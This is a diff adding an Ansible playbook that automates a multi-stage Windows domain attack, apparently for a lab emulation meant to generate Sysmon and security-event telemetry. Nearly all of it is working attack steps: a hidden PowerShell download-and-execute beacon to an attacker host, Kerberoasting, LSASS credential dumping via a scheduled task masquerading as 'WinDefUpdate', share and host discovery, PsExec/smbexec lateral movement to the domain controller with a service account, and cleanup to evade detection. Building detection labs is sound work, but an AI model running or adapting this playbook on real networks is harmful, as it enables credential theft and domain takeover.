@@ -1,0 +1,162 @@
+---
+# ansible/attack_day11.yml
+# Day 11 - Kerberoast + LSASS + AdFind + sweep + PsExec DC
+
+- name: "Day 11 - BEACHHEAD-PC: final objectives"
+  hosts: BEACHHEAD-PC
+  vars:
+    ps1_dir:   "{{ playbook_dir }}/../payloads/ps1"
+    kali_ip:   "10.0.10.60"
+    http_port: "8080"
+
+  tasks:
+
+    - name: "CLEANUP - delete all Day 11 files before fresh run"
+      ansible.windows.win_file:
+        path: "{{ item }}"
+        state: absent
+      loop:
+        - C:\ProgramData\keroast.ps1
+        - C:\ProgramData\ldump.ps1
+        - C:\ProgramData\sf.ps1
+        - C:\ProgramData\ps.txt
+        - C:\ProgramData\lsass.dmp
+        - C:\ProgramData\ShareFinder.txt
+        - C:\ProgramData\serv.log
+        - C:\ProgramData\work.log
+        - C:\ProgramData\ad_users.txt
+        - C:\ProgramData\ad_computers.txt
+        - C:\ProgramData\ad_ous.txt
+        - C:\ProgramData\trustdmp.txt
+      ignore_errors: yes
+
+    - name: "C2 - PowerShell IEX beacon (Sysmon Event 1)"
+      ansible.windows.win_shell: |
+        powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://{{ kali_ip }}:{{ http_port }}/wab.exe'))"
+      async: 5
+      poll: 0
+      ignore_errors: yes
+
+    - name: Pause for beacon
+      ansible.builtin.pause:
+        seconds: 10
+
+    - name: Drop kerberoast.ps1
+      ansible.windows.win_copy:
+        src: "{{ ps1_dir }}/kerberoast.ps1"
+        dest: C:\ProgramData\keroast.ps1
+
+    - name: "KERBEROAST - Invoke-Kerberoast (Event 4769 on DC)"
+      ansible.windows.win_shell: |
+        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\keroast.ps1
+      ignore_errors: yes
+
+    - name: Drop lsass_dump.ps1
+      ansible.windows.win_copy:
+        src: "{{ ps1_dir }}/lsass_dump.ps1"
+        dest: C:\ProgramData\ldump.ps1
+
+    - name: "LSASS - comsvcs MiniDump via scheduled task as SYSTEM (Sysmon Event 10)"
+      ansible.windows.win_shell: |
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
+          -Argument "-ExecutionPolicy Bypass -File C:\ProgramData\ldump.ps1"
+        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
+        $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+        Register-ScheduledTask -TaskName "WinDefUpdate" -Action $action `
+          -Trigger $trigger -Settings $settings -Principal $principal -Force
+        Start-Sleep -Seconds 15
+        Unregister-ScheduledTask -TaskName "WinDefUpdate" -Confirm:$false
+        Write-Output "[+] LSASS dump complete"
+      ignore_errors: yes
+
+    - name: "ADFIND - third run"
+      ansible.windows.win_shell: |
+        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\adfind_sub.ps1
+      ignore_errors: yes
+
+    - name: "SWEEP - server ping sweep (Sysmon Event 1)"
+      ansible.windows.win_shell: |
+        ping -n 1 -4 10.0.10.200 >> C:\ProgramData\serv.log
+        ping -n 1 -4 Goku.capsulecorp.local >> C:\ProgramData\serv.log
+        type C:\ProgramData\serv.log
+      ignore_errors: yes
+
+    - name: "SWEEP - workstation ping sweep"
+      ansible.windows.win_shell: |
+        ping -n 1 -4 10.0.10.210 >> C:\ProgramData\work.log
+        ping -n 1 -4 10.0.10.211 >> C:\ProgramData\work.log
+        type C:\ProgramData\work.log
+      ignore_errors: yes
+
+    - name: Drop sharefinder.ps1
+      ansible.windows.win_copy:
+        src: "{{ ps1_dir }}/sharefinder.ps1"
+        dest: C:\ProgramData\sf.ps1
+
+    - name: "SHAREFINDER - ShareFinder.txt (Sysmon Event 11)"
+      ansible.windows.win_shell: |
+        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\sf.ps1
+      ignore_errors: yes
+
+    - name: "DEFENSE EVASION - cleanup dropped files (Sysmon Event 23)"
+      ansible.windows.win_file:
+        path: "{{ item }}"
+        state: absent
+      loop:
+        - C:\ProgramData\keroast.ps1
+        - C:\ProgramData\ldump.ps1
+        - C:\ProgramData\sf.ps1
+        - C:\ProgramData\serv.log
+        - C:\ProgramData\work.log
+        - C:\ProgramData\lsass.dmp
+        - C:\ProgramData\ps.txt
+      ignore_errors: yes
+
+- name: "Day 11 - Kali: PsExec to DC"
+  hosts: localhost
+  gather_facts: no
+
+  tasks:
+
+    - name: "LATERAL MOVEMENT - PsExec DC as svc_backup (Event 7045 on DC)"
+      ansible.builtin.shell: |
+        SVC=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 7)
+        echo "[+] Service name: $SVC"
+        impacket-psexec CAPSULECORP.LOCAL/svc_backup:'{{ svc_pass }}'@10.0.10.200 \
+          -service-name $SVC \
+          "cmd.exe /c whoami && hostname" 2>&1 || true
+      ignore_errors: yes
+
+    - name: "LSASS on DC via svc_backup"
+      ansible.builtin.shell: |
+        impacket-smbexec CAPSULECORP.LOCAL/svc_backup:'{{ svc_pass }}'@10.0.10.200 \
+          -command "powershell -nop -c \"\$p=(Get-Process lsass).Id; rundll32 C:\windows\System32\comsvcs.dll, MiniDump \$p C:\ProgramData\dc_lsass.dmp full\"" 2>&1 || true
+      ignore_errors: yes
+
+- name: "Day 11 - YAMCHA-PC: cleanup"
+  hosts: YAMCHA-PC
+
+  tasks:
+
+    - name: "DEFENSE EVASION - cleanup YAMCHA-PC"
+      ansible.windows.win_file:
+        path: "{{ item }}"
+        state: absent
+      loop:
+        - C:\ProgramData\VulnRecon.ps1
+        - C:\ProgramData\Seatbelt.ps1
+        - C:\ProgramData\sysdat.txt
+        - C:\ProgramData\lsass.dmp
+        - C:\ProgramData\seatinfo.txt
+      ignore_errors: yes
+#    - name: "CLEANUP - uninstall AnyDesk for clean re-run (generates fresh Event 7045 next run)"
+#      ansible.windows.win_shell: |
+#        $anydesk = "C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
+#        if (Test-Path $anydesk) {
+#          Start-Process -FilePath $anydesk -ArgumentList "--remove" -Wait -NoNewWindow
+#          Write-Output "[+] AnyDesk uninstalled"
+#        } else {
+#          Write-Output "[-] AnyDesk not found"
+#        }
+#      ignore_errors: yes
